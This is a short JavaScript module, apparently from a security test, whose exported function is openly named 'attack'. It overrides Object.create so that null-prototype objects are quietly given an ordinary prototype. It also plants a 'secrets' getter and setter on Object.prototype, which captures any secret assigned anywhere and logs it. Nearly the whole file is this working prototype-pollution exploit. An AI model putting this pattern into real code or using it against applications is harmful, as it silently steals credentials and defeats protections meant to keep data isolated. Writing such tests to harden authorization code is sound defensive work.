let stolen;

// Action: Remove the functionality of accepting null prototype

const { create } = Object;
Object.create = (proto, props) => {
  return create(proto || {}, props);
};

Object.defineProperty(Object.prototype, 'secrets', {
  get: () => stolen,
  set: (v) => {
    stolen = v;
  },
});

export const attack = authzManager => {
  if (stolen) {
    console.log(stolen);
  }
};
